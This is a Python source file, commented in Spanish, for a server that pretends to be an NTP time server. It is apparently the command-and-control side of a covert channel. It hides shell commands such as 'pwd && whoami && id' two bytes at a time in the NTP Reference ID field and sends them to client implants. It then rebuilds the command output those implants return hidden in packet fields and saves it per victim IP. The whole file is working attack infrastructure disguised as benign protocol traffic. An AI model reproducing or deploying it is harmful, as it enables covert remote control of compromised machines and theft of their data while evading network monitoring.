import socket
import time
import struct
import threading
import os
from datetime import datetime
from pathlib import Path
from enum import Enum, auto

# ─────────────────────────────────────────────
#  Estados del servidor por cliente
# ─────────────────────────────────────────────
class EstadoServidor(Enum):
    ENVIANDO_COMANDO    = auto()   # fragmentando y enviando el comando al cliente
    ESPERANDO_RESPUESTA = auto()   # comando enviado, cliente está devolviendo resultado
    IDLE                = auto()   # todos los comandos ejecutados — no hacer nada


class SesionCliente:
    """Toda la información de estado de un cliente concreto."""

    def __init__(self, lista_comandos):
        self.lista_comandos  = lista_comandos
        self.indice_comando  = 0
        self.fragmento_tx    = 0
        self.estado          = EstadoServidor.ENVIANDO_COMANDO
        self.buffer_rx       = bytearray()

    # ── helpers ──────────────────────────────
    @property
    def comando_actual(self):
        return self.lista_comandos[self.indice_comando]

    def avanzar_comando(self):
        self.buffer_rx = bytearray()
        self.fragmento_tx = 0
        self.indice_comando += 1
        if self.indice_comando >= len(self.lista_comandos):
            # Todos los comandos ejecutados → IDLE definitivo
            self.estado = EstadoServidor.IDLE
            print("   🏁 Todos los comandos ejecutados — sesión en IDLE")
        else:
            self.estado = EstadoServidor.ENVIANDO_COMANDO

    def iniciar_espera_respuesta(self):
        self.estado       = EstadoServidor.ESPERANDO_RESPUESTA
        self.buffer_rx    = bytearray()
        self.fragmento_tx = 0


# ─────────────────────────────────────────────
#  Servidor
# ─────────────────────────────────────────────
class NTPServer:
    NTP_EPOCH_OFFSET = 2208988800
    LISTA_COMANDOS   = ["pwd && whoami && id"]

    def __init__(self, host='0.0.0.0', port=123):
        self.host     = host
        self.port     = port
        self.sock     = None
        self.running  = False
        self.lock     = threading.Lock()
        self.sesiones: dict[str, SesionCliente] = {}

    # ── ciclo principal ───────────────────────
    def start(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.running = True
            print(f"🕐 Servidor NTP iniciado en {self.host}:{self.port}")
            print(f"📅 Hora actual: {datetime.now()}\n")

            while self.running:
                try:
                    data, addr = self.sock.recvfrom(1024)
                    t = threading.Thread(target=self.handle_client, args=(data, addr), daemon=True)
                    t.start()
                except Exception as e:
                    if self.running:
                        print(f"❌ Error en bucle principal: {e}")
        finally:
            self.stop()

    # ── manejador por petición ────────────────
    def handle_client(self, data, addr):
        ip = addr[0]

        with self.lock:
            # Crear sesión si es la primera vez que vemos este cliente
            if ip not in self.sesiones:
                self.sesiones[ip] = SesionCliente(self.LISTA_COMANDOS)
                print(f"🆕 Nueva sesión para {ip}")

            sesion = self.sesiones[ip]
            response = self._procesar(data, addr, sesion)

        self.sock.sendto(response, addr)
        print(f"✅ Respondido a {addr[0]}:{addr[1]}  [estado={sesion.estado.name}]\n")

    # ── lógica central ────────────────────────
    def _procesar(self, data: bytes, addr, sesion: SesionCliente) -> bytearray:
        ip = addr[0]

        # 1. Leer datos que el cliente metió en el paquete
        cliente_ack = False
        if len(data) >= 48:
            datos1 = struct.unpack_from('!I', data, 24)[0]
            datos2 = struct.unpack_from('!I', data, 28)[0]
            cliente_ack = self._leer_datos_cliente(ip, datos1, datos2, sesion)

        # 2. Construir la respuesta según el estado actual
        response = self._build_base_response()
        self._rellenar_reference_id(response, sesion, cliente_ack)
        return response

    def _leer_datos_cliente(self, ip, datos1, datos2, sesion: SesionCliente):
        """Interpreta lo que el cliente devuelve en el campo originate/reference.

        Devuelve True si el cliente envió un ACK (paquete normal), False en
        cualquier otro caso (resultado en curso, paquete de transición, etc.)
        """
        MARCA_RESULTADO   = 0xFFFFFFFF
        MARCA_TRANSICION  = 0xFFFFFFFE   # cliente acabó de enviar, aún no listo

        if datos1 == MARCA_RESULTADO:
            # ── El cliente está devolviendo resultado ──────────────────────────
            if sesion.estado != EstadoServidor.ESPERANDO_RESPUESTA:
                return False

            num_frag  = (datos2 >> 16) & 0xFF
            mas_datos = (datos2 >> 15) & 1
            fragmento = datos2 & 0x7FFF
            byte1 = (fragmento >> 8) & 0xFF
            byte2 = fragmento & 0xFF

            if num_frag == 0:
                sesion.buffer_rx = bytearray()

            if byte1:
                sesion.buffer_rx.append(byte1)
            if byte2:
                sesion.buffer_rx.append(byte2)

            print(f"   📥 [{ip}] Fragmento resultado {num_frag} (más={mas_datos}): {bytes([byte1, byte2])}")

            if mas_datos == 0:
                try:
                    resultado = sesion.buffer_rx.decode('utf-8', errors='replace')
                except Exception:
                    resultado = repr(sesion.buffer_rx)

                print(f"\n{'='*60}")
                print(f"📋 RESULTADO '{sesion.comando_actual}' desde {ip}:")
                print(f"{'='*60}")
                print(resultado.strip())
                print(f"{'='*60}\n")

                self._guardar_resultado(ip, sesion.comando_actual, resultado)
                sesion.avanzar_comando()

            return False   # no es ACK

        elif datos1 == MARCA_TRANSICION:
            # ── Cliente en transición IDLE: aún no listo para nuevo fragmento ──
            print(f"   ⏸️  [{ip}] Paquete de transición — no avanzar fragmento")
            return False   # no es ACK

        else:
            # ── Paquete normal: ACK implícito ──────────────────────────────────
            print(f"   📊 [{ip}] Datos normales: {datos1}, {datos2}  → ACK")
            return True

    def _rellenar_reference_id(self, response: bytearray, sesion: SesionCliente,
                                cliente_ack: bool):
        """Escribe el Reference ID.

        Solo avanza al siguiente fragmento cuando cliente_ack=True, es decir,
        cuando el cliente envió un paquete normal confirmando que recibió el
        fragmento anterior y está listo para el siguiente.
        """
        if sesion.estado in (EstadoServidor.ESPERANDO_RESPUESTA, EstadoServidor.IDLE):
            struct.pack_into('!I', response, 12, 0x47505300)  # 'GPS\x00' — neutro
            return

        cmd_bytes  = sesion.comando_actual.encode()
        total_frag = (len(cmd_bytes) + 1) // 2
        num_frag   = sesion.fragmento_tx

        if num_frag >= total_frag:
            sesion.iniciar_espera_respuesta()
            struct.pack_into('!I', response, 12, 0x47505300)
            return

        # Construir el fragmento actual (puede ser el mismo que el ciclo anterior
        # si el cliente no envió ACK)
        inicio     = num_frag * 2
        fin        = min(inicio + 2, len(cmd_bytes))
        frag_bytes = cmd_bytes[inicio:fin]

        datos = 0
        if len(frag_bytes) >= 2:
            datos = (frag_bytes[0] << 8) | frag_bytes[1]
        elif len(frag_bytes) == 1:
            datos = frag_bytes[0] << 8

        mas   = 1 if num_frag < total_frag - 1 else 0
        valor = (0xFF << 24) | (num_frag << 16) | (mas << 15) | datos
        struct.pack_into('!I', response, 12, valor)

        if cliente_ack:
            # El cliente confirmó recepción del fragmento anterior → avanzar
            print(f"   📤 Fragmento cmd {num_frag}/{total_frag-1} (más={mas}): {frag_bytes}")
            sesion.fragmento_tx += 1
            if mas == 0:
                print(f"   ✅ Comando completo enviado: '{sesion.comando_actual}' — esperando respuesta")
                sesion.iniciar_espera_respuesta()
        else:
            # El cliente está ocupado enviando su resultado → repetir fragmento
            print(f"   🔁 Repitiendo fragmento cmd {num_frag} (cliente ocupado)")

    # ── helpers ───────────────────────────────
    def _build_base_response(self) -> bytearray:
        r = bytearray(48)
        r[0] = 0x24   # LI=0, VN=4, Mode=4 (server)
        r[1] = 1      # Stratum
        r[2] = 6      # Poll
        r[3] = 0xFA   # Precision

        t        = time.time() + self.NTP_EPOCH_OFFSET
        seconds  = int(t)
        fraction = int((t - seconds) * 2**32)
        struct.pack_into('!I', r, 40, seconds)
        struct.pack_into('!I', r, 44, fraction)
        return r

    def _guardar_resultado(self, ip: str, comando: str, resultado: str):
        """Persiste el resultado de un comando en un archivo dedicado.

        Estructura de archivos:
            resultados/
                <ip>/
                    <N>_<comando_sanitizado>.txt
        """
        try:
            # Directorio: resultados/<ip>/
            directorio = Path("resultados") / ip.replace(":", "_")
            directorio.mkdir(parents=True, exist_ok=True)

            # Número de orden basado en cuántos archivos hay ya
            orden = len(list(directorio.iterdir())) + 1

            # Nombre de archivo seguro: reemplazar caracteres problemáticos
            cmd_safe = comando.replace(" ", "_").replace("/", "-").replace("|", "-")
            cmd_safe = "".join(c for c in cmd_safe if c.isalnum() or c in "_-.")
            nombre = f"{orden:03d}_{cmd_safe}.txt"
            ruta = directorio / nombre

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            contenido = (
                f"Timestamp : {timestamp}\n"
                f"Cliente   : {ip}\n"
                f"Comando   : {comando}\n"
                f"{'='*60}\n"
                f"{resultado.strip()}\n"
            )

            ruta.write_text(contenido, encoding="utf-8")
            print(f"   💾 Guardado en: {ruta}")

        except Exception as e:
            print(f"   ⚠️  Error guardando resultado: {e}")

    def stop(self):
        self.running = False
        if self.sock:
            self.sock.close()


if __name__ == "__main__":
    server = NTPServer()
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()